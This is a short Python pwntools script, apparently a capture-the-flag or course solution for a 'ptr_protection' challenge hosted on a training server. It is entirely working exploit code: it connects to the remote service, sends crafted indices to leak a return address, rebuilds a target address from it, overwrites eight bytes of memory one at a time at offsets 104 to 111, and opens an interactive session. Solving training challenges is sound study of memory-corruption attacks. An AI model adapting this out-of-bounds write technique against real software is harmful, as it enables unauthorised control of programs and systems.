from pwn import *
import time
import subprocess
import sys

context.terminal = ['tmux', 'splitw', '-h']

#r = process("./ptr_protection")
#gdb.attach(r, """
#b printf
#unset env
#set disable-randomization off
#c
#""")

r = remote("bin.training.offdef.it", 4202)

input("wait")
r.sendline(b"40")
time.sleep(0.2)
r.sendline(b"75")
time.sleep(0.2)
r.sendline(b"-1")
time.sleep(0.2)
r.recvuntil(b"return 0x")
address = bytes.fromhex((r.recvuntil(b"4b")[:-3]+b'1e8').decode())
pad = 8 - (len(address) % 8)
address = b"\x00" * pad + address
print(address.hex())

for i in range(8):
    r.sendline(str(104+i).encode())
    time.sleep(0.2)
    r.sendline(str(address[7-i]).encode())
    time.sleep(0.2)

r.sendline(b"-1")
print("FINITO")
r.interactive()
